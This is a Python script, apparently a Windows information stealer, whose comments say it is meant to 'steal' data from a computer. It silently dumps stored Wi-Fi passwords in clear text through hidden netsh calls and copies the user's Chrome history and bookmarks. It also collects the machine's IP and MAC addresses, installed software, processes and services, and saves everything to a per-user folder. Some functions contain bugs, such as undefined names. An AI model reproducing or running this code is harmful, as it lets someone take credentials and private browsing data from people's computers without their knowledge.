import os, sys, platform, datetime
import ctypes, getpass, re, time, wmi
import socket, requests, win32com.client
import win32pdh, string, win32api, subprocess, psutil
from collections import namedtuple
from ctypes import byref, create_unicode_buffer, windll
from ctypes.wintypes import DWORD
from itertools import count
from uuid import getnode as get_mac

global osName, platformSystem, platformRelease, comUser, comName, win32_proc
global hostNameIP, publicIP, drives, system_info, sys_uname, processor, wifi_pass, mac_add

UID_BUFFER_SIZE = 39
PROPERTY_BUFFER_SIZE = 256
ERROR_MORE_DATA = 234
ERROR_INVALID_PARAMETER = 87
ERROR_SUCCESS = 0
ERROR_NO_MORE_ITEMS = 259
ERROR_UNKNOWN_PRODUCT = 1605

PRODUCT_PROPERTIES = [u'Language', u'ProductName',
                      u'PackageCode', u'Transforms', u'AssignmentType',
                      u'PackageName', u'InstalledProductName', u'VersionString',
                      u'RegCompany', u'RegOwner', u'ProductID',
                      u'ProductIcon', u'InstallLocation',
                      u'InstallSource', u'InstallDate', u'Publisher', u'LocalPackage',
                      u'HelpLink', u'HelpTelephone', u'URLInfoAbout', u'URLUpdateInfo',]

windows_services = ["NTDS","Alerter","ALG","AppMgmt","BITS","Browser","DoSvc","TrkWks","MSDTC","DNSCache","EventLog","EAPHost","CISVC","UI0Detect","SharedAccess","NLA","NSIS","NTLMSSP","PNRPSvc","PlugPlay","Spooler","RpcSs","RRAS","SecLogon","SamSs","SENS","SysMain","Schedule","LmHosts","VSS","AudioSrv","WERSvc","MpsSvc","SharedAccess","STISvc","W32Time","WUAUServ","WLANSvc","Messenger"]

class Search_Application:
    def get_property_for_product(product, property, buf_size=PROPERTY_BUFFER_SIZE):
        property_buffer = create_unicode_buffer(buf_size)
        size = DWORD(buf_size)
        result = windll.msi.MsiGetProductInfoW(product, property, property_buffer,byref(size))
        if result == ERROR_MORE_DATA:
            return get_property_for_product(product, property, 2 * buf_size)
        elif result == ERROR_SUCCESS:
            return property_buffer.value
        else:
            return None
    def populate_product(uid):
        properties = []
        for property in PRODUCT_PROPERTIES:
            properties.append(Search_Application.get_property_for_product(uid, property))
        return Product(*properties)
    def get_installed_products_uids():
        products = []
        for i in count(0):
            uid_buffer = create_unicode_buffer(UID_BUFFER_SIZE)
            result = windll.msi.MsiEnumProductsW(i, uid_buffer)
            if result == ERROR_NO_MORE_ITEMS:
                break
            products.append(uid_buffer.value)
        return products
    def get_installed_products():
        products = []
        for puid in Search_Application.get_installed_products_uids():
            products.append(Search_Application.populate_product(puid))
        return products
    def is_product_installed_uid(uid):
        buf_size = 256
        uid_buffer = create_unicode_buffer(uid)
        property = u'VersionString'
        property_buffer = create_unicode_buffer(buf_size)
        size = DWORD(buf_size)
        result = windll.msi.MsiGetProductInfoW(uid_buffer, property, property_buffer, byref(size))
        if result == ERROR_UNKNOWN_PRODUCT:
            return False
        else:
            return True
    
class Search_Resources:
    def get_os_name(term, check):
        if term and check:
            return os.name            
        else:
            return None
    def get_platform_sys(term):
        if term:
            return platform.system()
        else:
            return None
    def get_platform_release(term):
        if not term is False:
            return platform.release()
        else:
            return None
    def get_sys_info(term_check):
        if term_check:
            sysinfo = ((platform.system())+" "+platform.machine()+" "+platform.platform())
            return sysinfo
        else:
            return None
    def get_uname(term):
        if term:
            return platform.uname()
        else:
            return None
    def get_processor_info(term):
        if term:
            return platform.processor()
        else:
            return None
    def get_instance_win32_processor(term):
        if term:
            instance = wmi.WMI()
            for eachinfo in instance.WIN32_Processor():                
                return eachinfo
        else:
            return None
    def get_computer_name(term):
        if term:
            return socket.gethostname()
        else:
            return None
    def get_computer_user(term):
        if not term is False:
            return getpass.getuser()
        else:
            return None
    def get_drives(term_check):
        if term_check:
            return re.findall(r"[A-Z]+:.*$",os.popen("mountvol /").read(),re.MULTILINE)
        else:
            return None
    def get_free_space_mb(dirname):
        if platform.system() == 'Windows':
            free_bytes = ctypes.c_ulonglong(0)
            ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(dirname), None, None, ctypes.pointer(free_bytes))
            return free_bytes.value / 1024 / 1024
        else:
            return st.f_bavail * st.f_frsize / 1024 / 1024
    def get_hostname(term):
        if term:
            try:
                return socket.gethostbyname(socket.gethostname())
            except:
                return None
        else:
            return None
    def get_public_IP(term):
        if term:
            try:
                return requests.get("http://ip.42.pl/raw").text
            except:
                return None
        else:
            return None
    def get_mac_address(term):
        if term:
            mac = get_mac()
            return mac
        else:
            return None
    def procids():
        #each instance is a process, you can have multiple processes w/same name
        junk, instances = win32pdh.EnumObjectItems(None,None,'process', win32pdh.PERF_DETAIL_WIZARD)
        proc_ids=[]
        proc_dict={}
        for instance in instances:
            if instance in proc_dict:
                proc_dict[instance] = proc_dict[instance] + 1
            else:
                proc_dict[instance]=0
        for instance, max_instances in proc_dict.items():
            for inum in range(max_instances+1):
                hq = win32pdh.OpenQuery() # initializes the query handle 
                path = win32pdh.MakeCounterPath( (None,'process',instance, None, inum,'ID Process') )
                counter_handle=win32pdh.AddCounter(hq, path) 
                win32pdh.CollectQueryData(hq) #collects data for the counter 
                type, val = win32pdh.GetFormattedCounterValue(counter_handle, win32pdh.PDH_FMT_LONG)
                proc_ids.append((instance,str(val)))
                win32pdh.CloseQuery(hq) 
     
        proc_ids.sort()
        return proc_ids
    def get_stored_wifi_passwords(check):
        CREATE_NO_WINDOW = 0x08000000
        if check:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'],creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
            for i in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'],creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')
                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                    try:                        
                        stored_wifi_pass.append("{:<30}|  {:<}\n".format(i, results[0]))
                    except:
                        stored_wifi_pass.append("{:<30}|  {:<}\n".format(i, ""))
                except:                    
                    return stored_wifi_pass

            return stored_wifi_pass
        else:
            return None
    def getService(name):    
        try:
            service = psutil.win_service_get(name)
            service = service.as_dict()
            return service
        except Exception as ex:
            pass


drives = []
spaces_in_drives = []
drive_letters = []
installed_applications = []
stored_wifi_pass = []
Product = namedtuple('Product', PRODUCT_PROPERTIES)



#get the important resources first
try:
    osName = Search_Resources.get_os_name(True, True)
    platformSystem = Search_Resources.get_platform_sys(True)
    platformRelease = Search_Resources.get_platform_release(True)
    system_info = Search_Resources.get_sys_info(True)
    sys_uname = Search_Resources.get_uname(True)
    processor = Search_Resources.get_processor_info(True)
    win32_proc = Search_Resources.get_instance_win32_processor(True)
    wifi_pass = Search_Resources.get_stored_wifi_passwords(True)
    comName = Search_Resources.get_computer_name(True)
    comUser = Search_Resources.get_computer_user(True)
    drives = Search_Resources.get_drives(True)
    hostNameIP = Search_Resources.get_hostname(True)
    publicIP = Search_Resources.get_public_IP(True)
    mac_add = Search_Resources.get_mac_address(True)
    for eachDrives in drives:
        spaces_in_drives.append(Search_Resources.get_free_space_mb(eachDrives)/1024)
        drive_letters.append(eachDrives)
except:
    pass

#if there's no errors of the above code, let's search for some installed programs in a computer
try:
    for app in Search_Application.get_installed_products():
        installed_applications.append(app.InstalledProductName)
except:
    pass

#compile all gathered resources and steal it from the computer
#if there's no error again of the above code, let's get its Browser History and Bookmarks, and also its Background Processes
if os.path.isdir("Resources"):
    try:
        os.chdir("Resources")
        if not os.path.isdir(comUser):
            os.mkdir(comUser)
        os.chdir(comUser)
        #create a file to append all gathered informations: (this will not affect existing file if there is an existing file already)
        with open("computer-information.info","w") as cominfo:
            cominfo.close()
        with open("installed-applications.info","w") as inapps:
            inapps.close()
        with open("browser-history.info","w") as bhistory:
            bhistory.close()
        with open("browser-bookmarks.info","w") as bbookmark:
            bbookmark.close()
        with open("background-processes.info","w") as bprocesses:
            bprocesses.close()
        with open("windows-services.info","w") as wservice:
            wservice.close()

        #write all gathered computer info to our .info file
        com_info = open("computer-information.info", "w")
        com_info.write("{}: {}\n".format(comName, str(datetime.datetime.now())))
        com_info.write("========================================================================\n\n")
        com_info.write("Platform Information: {}\n".format(osName+" "+platformSystem+" "+platformRelease))
        com_info.write("System Information: {}\n".format(system_info))
        com_info.write("Platform UNAME: {}\n".format(sys_uname))
        com_info.write("Processor: {}\n".format(processor))
        com_info.write("Instance of Win32 Processor: {}\n".format(win32_proc))
        com_info.write("Computer Name and User: {}, {}\n".format(comName, comUser))
        com_info.write("Detected Drives: {}\n".format(drive_letters))
        com_info.write("Available Spaces for each Drives: {}\n".format(spaces_in_drives))
        com_info.write("Host-IP: {}\n".format(hostNameIP))
        com_info.write("Public-IP: {}\n".format(publicIP))
        com_info.write("Mac Address: {}\n".format(mac_add))
        com_info.write("Wifi-Password: {}\n\n".format(wifi_pass))
        com_info.write("Coded by: ARIEN")
        com_info.close()

        #write all gathered installed applications to our .info file
        inapps_info = open("installed-applications.info","w")
        for eachApps in installed_applications:
            inapps_info.write("{}+\n".format(eachApps))
        inapps_info.close()

        try:
            if platformSystem == "Windows":
                #now steal first browser's history and bookmarks
                with open(r"C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\History"%comUser,"rb") as his_file:
                    history_data = his_file.read()
                his_file.close()
                with open(r"C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"%comUser,"rb") as bm_file:
                    bookmark_data = bm_file.read()
                bm_file.close()
                
                #write the stolen browser's history and bookmarks
                bhistory_info = open("browser-history.info","wb")
                bhistory_info.write(history_data)
                bhistory_info.close()
                bbookmark_info = open("browser-bookmarks.info","wb")
                bbookmark_info.write(bookmark_data)
                bbookmark_info.close()
            else:
                print("Cannot get Browser's history and bookmarks, maybe because it's a Linux Platform or Mac")
        except:
            print("Cannot get some files")

        #now let's get all current background processes.
        bproc_info = open("background-processes.info","w")
        bproc_info.write("{}: {}\n==============================================================\n".format(comName, str(datetime.datetime.now())))
        for eachProcesses in Search_Resources.procids():    
            bproc_info.write("Name: %s\tPID: %s\n" % (eachProcesses[0], eachProcesses[1]))
        bproc_info.close()

        #get windows services
        wservice_info = open("windows-services.info","w")
        wservice_info.write("{}: {}\n==============================================================\n".format(comName, str(datetime.datetime.now())))
        for eachService in windows_services:
            service = Search_Resources.getService(eachService)
            if service:
                wservice_info.write("Service Found\n")
                wservice_info.write("Service Name: %s\n"%service['name'])
                wservice_info.write("\tUsername: %s\n"%service['username'])
                wservice_info.write("\tStart Type: %s\n"%service['start_type'])
                wservice_info.write("\tStatus: %s\n"%service['status'])
                wservice_info.write("\tDescription: %s\n"%service['description'])
            else:
                wservice_info.write("Service not found\n")
        wservice_info.close()
    except:
        pass

else:
    time.sleep(2)
    print("[x]  ---  Resources folder is missing..")
    time.sleep(2)
    print("[x]  ---  Missing one required directory...")
    print("Failed to collect informations ... ")
    time.sleep(2)
    sys.exit()
